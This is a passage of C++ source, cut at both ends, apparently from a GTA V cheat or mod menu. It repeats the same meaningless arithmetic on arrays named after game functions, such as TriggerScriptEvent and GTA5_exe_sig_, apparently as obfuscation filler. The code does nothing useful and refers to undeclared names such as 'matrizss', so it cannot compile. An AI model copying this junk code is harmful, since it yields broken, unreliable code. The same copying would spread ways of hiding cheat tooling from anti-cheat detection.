					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				istringstream tokenizer{ line };
				string token;

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
